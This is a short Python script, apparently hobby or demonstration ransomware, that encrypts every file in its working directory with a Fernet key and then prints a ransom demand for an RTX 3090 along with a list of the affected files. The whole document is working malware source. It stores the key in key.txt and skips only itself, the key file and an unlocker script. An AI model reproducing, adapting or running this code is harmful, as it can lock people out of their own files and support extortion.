import os
from cryptography.fernet import Fernet
data = []
for item in os.listdir():
		if item == "ransomeware.py" or item == "key.txt" or item == "unlocker.py":
			continue
		if os.path.isfile(item):	
			data.append(item)
encryption = Fernet.generate_key()
with open("key.txt","wb") as key:
		key.write(encryption)
for item in data:
	with open(item,"rb") as content:
			elements = content.read()
	encrypted = Fernet(encryption).encrypt(elements)
	with open(item,"wb") as content:
			content.write(encrypted)
print("Your Files are encrypted by Mr. Jones. To unlock send me a RTX 3090")
print("I have encrypted following files:")
for x in range(len(data)):
	print(f"{str(x+1)}. {data[x]}")